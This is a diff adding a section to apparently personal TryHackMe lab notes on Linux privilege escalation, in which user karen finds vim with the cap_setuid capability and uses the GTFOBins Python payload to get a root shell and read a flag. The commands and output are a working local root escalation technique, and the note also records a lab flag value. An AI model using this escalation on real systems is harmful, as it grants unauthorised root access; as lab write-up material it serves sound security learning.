@@ -737,6 +737,60 @@ THM-3847834
 
 
 
+## PRIVILEGE ESCALATION: Capabilities
+
+me=10.10.38.133
+target=10.10.149.140
+
+```
+karen@ip-10-10-149-140:~$ getcap -r / 2>/dev/null
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/home/karen/vim = cap_setuid+ep
+/home/ubuntu/view = cap_setuid+ep
+karen@ip-10-10-149-140:~$
+
+# Checking owners and group
+karen@ip-10-10-149-140:~$ ls -la /home/ubuntu/view
+-rwxr-xr-x 1 root root 2906824 Jun 18  2021 /home/ubuntu/view
+karen@ip-10-10-149-140:~$ ls -la /home/karen/vim
+-rwxr-xr-x 1 root root 2906824 Jun 18  2021 /home/karen/vim
+
+```
+
+tried escalating via SUID not working,
+checking how to escalte via VIM Capabilities
+`https://gtfobins.github.io/gtfobins/vim/#capabilities`
+
+```
+cp $(which vim) .
+sudo setcap cap_setuid+ep vim
+
+./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+
+```
+
+now testing it to karen user
+```
+/home/karen/vim ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+# id
+uid=0(root) gid=1001(karen) groups=1001(karen)
+# bash
+root@ip-10-10-149-140:~# id
+uid=0(root) gid=1001(karen) groups=1001(karen)
+root@ip-10-10-149-140:~# whoami
+root
+root@ip-10-10-149-140:~# find / -name flag4.txt 2>/dev/null
+/home/ubuntu/flag4.txt
+root@ip-10-10-149-140:~# cat /home/ubuntu/flag4.txt
+THM-9349843
+
+```
+
+
+
 
 
 
